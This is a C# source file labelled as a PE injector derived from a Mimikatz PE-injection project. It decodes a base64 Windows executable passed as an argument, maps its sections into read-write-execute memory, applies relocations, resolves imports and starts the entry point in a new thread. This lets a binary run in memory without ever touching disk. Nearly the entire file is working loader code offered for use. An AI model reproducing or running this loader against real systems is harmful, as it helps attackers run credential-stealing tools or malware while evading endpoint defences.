using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

/* PE injector */
/* based on: https://raw.githubusercontent.com/analyticsearch/Mimikatz-PE-Injection/refs/heads/master/katz.cs */

namespace PW001
{
    public class Program
    {
        public struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [Flags]
        public enum DataSectionFlags : uint
        {
            Stub = 0x00000000,
        }

        public enum MachineType : ushort
        {
            Native = 0,
            I386 = 0x014c,
            Itanium = 0x0200,
            x64 = 0x8664
        }
        public enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
        }
        public enum SubSystemType : ushort
        {
            IMAGE_SUBSYSTEM_UNKNOWN = 0,
            IMAGE_SUBSYSTEM_NATIVE = 1,
            IMAGE_SUBSYSTEM_WINDOWS_GUI = 2,
            IMAGE_SUBSYSTEM_WINDOWS_CUI = 3,
            IMAGE_SUBSYSTEM_POSIX_CUI = 7,
            IMAGE_SUBSYSTEM_WINDOWS_CE_GUI = 9,
            IMAGE_SUBSYSTEM_EFI_APPLICATION = 10,
            IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER = 11,
            IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER = 12,
            IMAGE_SUBSYSTEM_EFI_ROM = 13,
            IMAGE_SUBSYSTEM_XBOX = 14

        }
        public enum DllCharacteristicsType : ushort
        {
            RES_0 = 0x0001,
            RES_1 = 0x0002,
            RES_2 = 0x0004,
            RES_3 = 0x0008,
            IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x0040,
            IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY = 0x0080,
            IMAGE_DLL_CHARACTERISTICS_NX_COMPAT = 0x0100,
            IMAGE_DLLCHARACTERISTICS_NO_ISOLATION = 0x0200,
            IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400,
            IMAGE_DLLCHARACTERISTICS_NO_BIND = 0x0800,
            RES_4 = 0x1000,
            IMAGE_DLLCHARACTERISTICS_WDM_DRIVER = 0x2000,
            IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE = 0x8000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        public static T FromBinaryReader<T>(BinaryReader reader)
        {
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }
        private static bool Is32BitHeader(IMAGE_FILE_HEADER fHeader)
        {
            {
                UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & fHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(
          IntPtr lpThreadAttributes,
          uint dwStackSize,
          IntPtr lpStartAddress,
          IntPtr param,
          uint dwCreationFlags,
          IntPtr lpThreadId
          );

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        public static void Main(string[] args)
        {
            string exes = args[0];
            byte[] exe = System.Convert.FromBase64String(exes);

            IMAGE_DOS_HEADER dosHeader;
            IMAGE_FILE_HEADER fileHeader;
            IMAGE_OPTIONAL_HEADER32 optionalHeader32 = new IMAGE_OPTIONAL_HEADER32();
            IMAGE_OPTIONAL_HEADER64 optionalHeader64 = new IMAGE_OPTIONAL_HEADER64();
            IMAGE_SECTION_HEADER[] imageSectionHeaders;
            byte[] rawbytes;

            try
            {
                using (MemoryStream stream = new MemoryStream(exe, 0, exe.Length))
                {
                    BinaryReader reader = new BinaryReader(stream);
                    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                    // Add 4 bytes to the offset
                    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                    UInt32 ntHeadersSignature = reader.ReadUInt32();
                    fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                    if (Is32BitHeader(fileHeader))
                    {
                        optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                    }
                    else
                    {
                        optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                    }

                    imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            
                    for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                    {
                        imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                    }

                    rawbytes = exe;

                    IntPtr codebase;

                    if (Is32BitHeader(fileHeader))
                    {
                        codebase = VirtualAlloc(IntPtr.Zero, optionalHeader32.SizeOfImage, (uint) AllocationType.Commit, (uint) MemoryProtection.ExecuteReadWrite);
                    }
                    else
                    {
                        codebase = VirtualAlloc(IntPtr.Zero, optionalHeader64.SizeOfImage, (uint)AllocationType.Commit, (uint)MemoryProtection.ExecuteReadWrite);
                    }

                    //Copy Sections
                    for (int i = 0; i < fileHeader.NumberOfSections; i++)
                    {
                        IntPtr target = IntPtr.Add(codebase, (int)imageSectionHeaders[i].VirtualAddress);
                        IntPtr y = VirtualAlloc(target, imageSectionHeaders[i].SizeOfRawData, (uint)AllocationType.Commit, (uint)MemoryProtection.ExecuteReadWrite);
                        Marshal.Copy(rawbytes, (int)imageSectionHeaders[i].PointerToRawData, y, (int)imageSectionHeaders[i].SizeOfRawData);
                    }

                    //Perform Base Relocation
                    //Calculate Delta
                    IntPtr currentbase = codebase;
                    long delta;
                    if (Is32BitHeader(fileHeader))
                    {

                        delta = (int)(currentbase.ToInt32() - (int)optionalHeader32.ImageBase);
                    }
                    else
                    {
                        delta = (long)(currentbase.ToInt64() - (long)optionalHeader64.ImageBase);
                    }

                    //Modify Memory Based On Relocation Table
                    IntPtr relocationTable;
                    if (Is32BitHeader(fileHeader))
                    {
                        relocationTable = (IntPtr.Add(codebase, (int)optionalHeader32.BaseRelocationTable.VirtualAddress));
                    }
                    else
                    {
                        relocationTable = (IntPtr.Add(codebase, (int)optionalHeader64.BaseRelocationTable.VirtualAddress));
                    }


                    IMAGE_BASE_RELOCATION relocationEntry = new IMAGE_BASE_RELOCATION();
                    relocationEntry = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(IMAGE_BASE_RELOCATION));

                    int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION));
                    IntPtr nextEntry = relocationTable;
                    int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
                    IntPtr offset = relocationTable;

                    while (true)
                    {
                        IMAGE_BASE_RELOCATION relocationNextEntry = new IMAGE_BASE_RELOCATION();
                        IntPtr x = IntPtr.Add(relocationTable, sizeofNextBlock);
                        relocationNextEntry = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(x, typeof(IMAGE_BASE_RELOCATION));

                        IntPtr dest = IntPtr.Add(codebase, (int)relocationEntry.VirtualAdress);

                        for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                        {

                            IntPtr patchAddr;
                            UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));

                            UInt16 type = (UInt16)(value >> 12);
                            UInt16 fixup = (UInt16)(value & 0xfff);

                            switch (type)
                            {
                                case 0x0:
                                    break;
                                case 0x3:
                                    patchAddr = IntPtr.Add(dest, fixup);
                                    //Add Delta To Location.                            
                                    int originalx86Addr = Marshal.ReadInt32(patchAddr);
                                    Marshal.WriteInt32(patchAddr, originalx86Addr + (int)delta);
                                    break;
                                case 0xA:
                                    patchAddr = IntPtr.Add(dest, fixup);
                                    //Add Delta To Location.
                                    long originalAddr = Marshal.ReadInt64(patchAddr);
                                    Marshal.WriteInt64(patchAddr, originalAddr + delta);
                                    break;
                            }
                        }

                        offset = IntPtr.Add(relocationTable, sizeofNextBlock);
                        sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                        relocationEntry = relocationNextEntry;

                        nextEntry = IntPtr.Add(nextEntry, sizeofNextBlock);

                        if (relocationNextEntry.SizeOfBlock == 0) break;
                    }

                    //Resolve Imports
                    IntPtr z;
                    IntPtr oa1;
                    int oa2;

                    if (Is32BitHeader(fileHeader))
                    {
                        z = IntPtr.Add(codebase, (int)imageSectionHeaders[1].VirtualAddress);
                        oa1 = IntPtr.Add(codebase, (int)optionalHeader32.ImportTable.VirtualAddress);
                        oa2 = Marshal.ReadInt32(IntPtr.Add(oa1, 16));
                    }
                    else
                    {
                        z = IntPtr.Add(codebase, (int)imageSectionHeaders[1].VirtualAddress);
                        oa1 = IntPtr.Add(codebase, (int)optionalHeader64.ImportTable.VirtualAddress);
                        oa2 = Marshal.ReadInt32(IntPtr.Add(oa1, 16));
                    }

                    //Get And Display Each DLL To Load
                    IntPtr threadStart;
                    IntPtr hThread;
                    if (Is32BitHeader(fileHeader))
                    {
                        int j = 0;
                        while (true) //HardCoded Number of DLL's Do this Dynamically.
                        {
                            IntPtr a1 = IntPtr.Add(codebase, (20 * j) + (int)optionalHeader32.ImportTable.VirtualAddress);
                            int entryLength = Marshal.ReadInt32(IntPtr.Add(a1, 16));
                            IntPtr a2 = IntPtr.Add(codebase, (int)imageSectionHeaders[1].VirtualAddress + (entryLength - oa2));
                            IntPtr dllNamePTR = (IntPtr)(IntPtr.Add(codebase, Marshal.ReadInt32(IntPtr.Add(a1, 12))));
                            string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                            if (DllName == "") { break; }

                            IntPtr handle = LoadLibrary(DllName);
                            Console.WriteLine("Loaded {0}", DllName);
                            int k = 0;
                            while (true)
                            {
                                IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, Marshal.ReadInt32(a2)));
                                string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
                                IntPtr funcAddy = GetProcAddress(handle, DllFuncName);
                                Marshal.WriteInt32(a2, (int)funcAddy);
                                a2 = IntPtr.Add(a2, 4);
                                if (DllFuncName == "") break;
                                k++;
                            }
                            j++;
                        }
                        Console.WriteLine("Executing binary");
                        threadStart = IntPtr.Add(codebase, (int)optionalHeader32.AddressOfEntryPoint);
                        hThread = CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                        WaitForSingleObject(hThread, 0xFFFFFFFF);

                        Console.WriteLine("Thread Complete");
                    }
                    else
                    {
                        int j = 0;
                        while (true)
                        {
                            IntPtr a1 = IntPtr.Add(codebase, (20 * j) + (int)optionalHeader64.ImportTable.VirtualAddress);
                            int entryLength = Marshal.ReadInt32(IntPtr.Add(a1, 16));
                            IntPtr a2 = IntPtr.Add(codebase, (int)imageSectionHeaders[1].VirtualAddress + (entryLength - oa2)); //Need just last part? 
                            IntPtr dllNamePTR = (IntPtr)(IntPtr.Add(codebase, Marshal.ReadInt32(IntPtr.Add(a1, 12))));
                            string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                            if (DllName == "") { break; }

                            IntPtr handle = LoadLibrary(DllName);
                            Console.WriteLine("Loaded {0}", DllName); 
                            int k = 0;
                            while (true)
                            {
                                IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, Marshal.ReadInt32(a2)));
                                string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
                                Console.WriteLine("Function {0}", DllFuncName);
                                IntPtr funcAddy = GetProcAddress(handle, DllFuncName);
                                Marshal.WriteInt64(a2, (long)funcAddy);
                                a2 = IntPtr.Add(a2, 8);
                                if (DllFuncName == "") break;
                                k++;
                            }
                            j++;
                        }

                        Console.WriteLine("Executing binary");
                        threadStart = IntPtr.Add(codebase, (int)optionalHeader64.AddressOfEntryPoint);
                        hThread = CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                        WaitForSingleObject(hThread, 0xFFFFFFFF);

                        Console.WriteLine("Thread Complete");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            finally
            {
                
            }

        }
    }
}
